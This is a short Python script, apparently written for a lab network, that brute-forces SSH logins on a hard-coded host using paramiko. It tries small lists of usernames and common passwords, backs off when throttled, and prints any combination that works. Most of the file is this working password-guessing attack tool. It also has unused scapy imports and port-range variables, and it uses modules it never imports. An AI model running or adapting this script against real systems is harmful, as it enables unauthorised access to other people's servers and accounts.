from scapy.all import *
from scapy.layers.inet import TCP, IP
import yaml
import paramiko
import socket
import time



logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Setting network components and addresses from config file
# ---------------------------------------------------------------------------------------------------------------------
try:
    network_config_file = open(os.path.join(os.path.dirname(__file__), 'network_conf.yaml'))
    network_config = yaml.load(network_config_file, Loader=yaml.FullLoader)
except Exception:
    raise Exception("Provide a valid network_conf.yaml")

target = "192.168.10.35"
startport = 1
endport = 50

user_list = ("kali", "test")
password_list = ("1234", "server", "password", "123456", "kali")



def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f'Try credentials: user="{username}", password="{password}"')
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=0.1)
    except socket.timeout:
        print("socket timeout")
        return False
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        print(f"[*] Quota exceeded, retrying with delay...")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return True

for user in user_list:
    for password in password_list:
        is_ssh_open(target, user, password)